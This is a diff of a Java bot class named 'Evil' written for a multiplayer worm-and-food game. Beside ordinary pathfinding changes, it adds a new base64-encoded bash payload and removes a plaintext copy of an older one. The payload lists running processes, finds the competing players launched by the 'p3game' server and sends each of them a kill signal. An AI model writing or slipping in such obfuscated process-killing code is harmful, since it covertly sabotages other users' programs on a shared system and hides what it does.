@@ -8,9 +8,9 @@ public class Evil
 {
   public static void main(String[] args) throws Exception
   {
-    //String Base = "SUZTPSQnXG4nO2F1eD0oICQocHMgYXV4KSApO3BzPSggJChwcyAtbyBwaWQscHBpZCkgKTtkZWNsYXJlIC1hIHdvcm1zO2RlY2xhcmUgLWEgUElEUztjb3VudD0wO2ZvciBpIGluICR7YXV4WypdfTtkbyBpZiBbWyAkaSA9IConL2Jpbi9iYXNoIC0gLi9ldmlsLnNoJyogXV07IHRoZW4gSUZTPSQnICc7IGxpbmU9KCAkaSApOyBteVBJRD0ke2xpbmVbMV19OyBteVdvcm09JChwcyAtbyBwcGlkPSAtcCAkbXlQSUQpOyBmaTsgaWYgW1sgJGkgPSAqJ3AzZ2FtZScqIF1dOyB0aGVuIElGUz0kJyAnOyBsaW5lPSggJGkgKTsgcGFyZW50UElEPSR7bGluZVsxXX07IG5hbWU9JHtpIyMqcDNnYW1lIH07IGRlY2xhcmUgLWEgd29ybXM9KCAkbmFtZSApOyBmaTsgZm9yIGogaW4gJHtuYW1lWypdfTsgZG8gbGluZT0oICRpICk7IGlmIFtbICRpID0gKiRqKiBdXTsgdGhlbiBpZiBbWyAke2xpbmVbMV19IC1uZSAkcGFyZW50UElEIF1dOyB0aGVuIFBJRFNbJGNvdW50XT0ke2xpbmVbMV19OyBsZXQgY291bnQrKzsgZmk7IGZpOyBkb25lOyBkb25lOyBmb3IgaSBpbiAke1BJRFNbQF19OyBkbyBpZiBbWyAkaSAtbmUgJG15V29ybSBdXTsgdGhlbiBlY2hvICQoa2lsbCAtMiAkaSk7IGZpOyBkb25lOw==";
-    String Base = "SUZTPSQnXG4nO2F1eD0oICQocHMgYXV4KSApO3BzPSggJChwcyAtbyBwaWQscHBpZCkgKTtkZWNsYXJlIC1hIHdvcm1zO2RlY2xhcmUgLWEgUElEUztjb3VudD0wO2ZvciBpIGluICR7YXV4WypdfTtkbyAgIGlmIFtbICRpIC1uZSAqInAzZ2FtZSIqIF1dOyB0aGVuICAgIGlmIFtbICRpID0gKiJldmlsIiogXV07IHRoZW4gICBJRlM9JCcgJzsgICBsaW5lPSggJGkgKTsgICAgICAgbXlQSUQ9JHtsaW5lWzFdfTsgICAgbXlXb3JtPSQocHMgLW8gcHBpZD0gLXAgJG15UElEKTsgICAgZmk7ICAgZmkgOyAgaWYgW1sgJGkgPSAqInAzZ2FtZSIqIF1dOyB0aGVuICAgICBJRlM9JCcgJzsgIGxpbmU9KCAkaSApOyAgIHBhcmVudFBJRD0ke2xpbmVbMV19OyAgbmFtZT0ke2kjIypwM2dhbWUgfTsgIGRlY2xhcmUgLWEgd29ybXM9KCAkbmFtZSApOyBmaTsgIGZvciBqIGluICR7bmFtZVsqXX07IGRvIGxpbmU9KCAkaSApIDsgaWYgW1sgJGkgPSAqJGoqIF1dOyB0aGVuIGlmIFtbICR7bGluZVsxXX0gLW5lICRwYXJlbnRQSUQgXV07IHRoZW4gUElEU1skY291bnRdPSR7bGluZVsxXX07IGxldCBjb3VudCsrOyBmaTsgZmk7IGRvbmU7IGRvbmU7Zm9yIGkgaW4gJHtQSURTW0BdfTsgZG8gZWNobyAkbXlQSUQ7IGlmIFtbICRpIC1uZSAkbXlQSUQgXV07IHRoZW4gIGVjaG8gJGk7ICQoa2lsbCAtMiAkaSk7IGZpOyBkb25l";
-    //String command="/bin/bash - IFS=$'\\n';aux=( $(ps aux) );ps=( $(ps -o pid,ppid) );declare -a worms;declare -a PIDS;count=0;for i in ${aux[*]};do if [[ $i = *'/bin/bash - ./evil.sh'* ]]; then IFS=$' '; line=( $i ); myPID=${line[1]}; myWorm=$(ps -o ppid= -p $myPID); fi; if [[ $i = *'p3game'* ]]; then IFS=$' '; line=( $i ); parentPID=${line[1]}; name=${i##*p3game }; declare -a worms=( $name ); fi; for j in ${name[*]}; do line=( $i ); if [[ $i = *$j* ]]; then if [[ ${line[1]} -ne $parentPID ]]; then PIDS[$count]=${line[1]}; let count++; fi; fi; done; done; for i in ${PIDS[@]}; do if [[ $i -ne $myWorm ]]; then $(kill -2 $i); fi; done";
+    String Base = 
+      "SUZTPSQnXG4nO2F1eD0oICQocHMgYXV4KSApO2RlY2xhcmUgLWEgd29ybXM7ZGVjbGFyZSAtYSBQSURTO2NvdW50PTA7bXlXb3JtPSQocHMgLW8gcHBpZD0gLXAgJCQpOyBmb3IgaSBpbiAke2F1eFsqXX07ZG8gaWYgW1sgJGkgPSAqInAzZ2FtZSIqIF1dOyB0aGVuIElGUz0kJyAnOyAgbGluZT0oICRpICk7ICAgcGFyZW50UElEPSR7bGluZVsxXX07ICBuYW1lPSR7aSMjKnAzZ2FtZSB9OyAgZGVjbGFyZSAtYSB3b3Jtcz0oICRuYW1lICk7IGZpOyAgZm9yIGogaW4gJHtuYW1lWypdfTsgZG8gbGluZT0oICRpICkgOyBpZiBbWyAkaSA9ICokaiogXV07IHRoZW4gaWYgW1sgJHtsaW5lWzFdfSAtbmUgJHBhcmVudFBJRCBdXTsgdGhlbiBQSURTWyRjb3VudF09JHtsaW5lWzFdfTsgbGV0IGNvdW50Kys7IGZpOyBmaTsgZG9uZTsgZG9uZTtmb3IgaSBpbiAke1BJRFNbQF19OyBkbyAgaWYgW1sgJGkgLW5lICRteVdvcm0gXV07IHRoZW4gJChraWxsIC0yICRpKTsgZmk7IGRvbmU7";
+
     Process process = Runtime.getRuntime().exec(new String[]{"echo", Base});
     String line;
     OutputStream stdin = null;
@@ -43,9 +43,9 @@ public class Evil
 
     BufferedReader brCleanUp3 =
       new BufferedReader (new InputStreamReader (stdout));
-    line = brCleanUp3.readLine ();
+    while ((line = brCleanUp3.readLine ()) != null) 
+      System.err.println(line);
     brCleanUp.close();
-    System.err.println(line);
 
     stderr = process.getErrorStream ();
     brCleanUp =
@@ -54,34 +54,7 @@ public class Evil
       System.out.println ("[Stderr] " + line);
     }
     brCleanUp.close();
-                    
 
-                    
-
-    /*ProcessBuilder builder = new ProcessBuilder(new String[]{"echo", Base});
-    final Process process = builder.start();
-    InputStream is = process.getInputStream();
-    InputStreamReader isr = new InputStreamReader(is);
-    BufferedReader br = new BufferedReader(isr);
-    line = br.readLine();
-    System.err.println(line);
-    ProcessBuilder builder2 = new ProcessBuilder(new String[]{"base64", "-d"});
-    final Process process2 = builder.start();
-    InputStream is2 = process.getInputStream();
-    InputStreamReader isr2 = new InputStreamReader(is2);
-    BufferedReader br2 = new BufferedReader(isr2);
-    OutputStream os2 = process.getOutputStream();
-    OutputStreamWriter osr2 = new OutputStreamWriter(os2);
-    BufferedWriter bw2 = new BufferedWriter(osr2);
-    bw2.write(line);
-    while ((line = br2.readLine()) != null)
-      System.err.println(line);
-    */
-    //Process p = Runtime.getRuntime().exec(new String[]{"echo",  Base});
-    //Process a = Runtime.getRuntime().exec(new String[]{"base64", "-d"});
-    //inheritIO(p.getInputStream(), System.err);
-    //a.getInputStream(p.getOutputStream());
-    //Process b = Runtime.getRuntime().exec(new String[]{"/bin/bash"});
     long start = System.currentTimeMillis();
     Scanner sc = new Scanner(System.in);
     Evil brain = new Evil();
@@ -334,7 +307,10 @@ public class Evil
 	  i_target++;
 	break;
       case 'x': // "x" a piece of food was eaten - maybe by you, maybe not
-	food.remove(Pos.read(sc));
+        Pos eaten = Pos.read(sc);
+        if(path.contains(eaten))
+          path.remove(eaten);
+	food.remove(eaten);
 	break;
       case 'm': // "move" the server asked us to make a move
 	int round = sc.nextInt();
@@ -344,7 +320,6 @@ public class Evil
 	  move = 'F'; // if no food remains or finished with path, charge ahead!
 	else
           move = BLANK.getFirstMoveOnShortestPath(mypos, mydir, path.get(i_target));
-	  //move = mydir.getMoveTowards(mypos,path.get(i_target)); // move towards the current target
 	mydir = mydir.turn(move); // update direction based on the turn
 	System.out.println(move); // send our move back to the server
 	break;
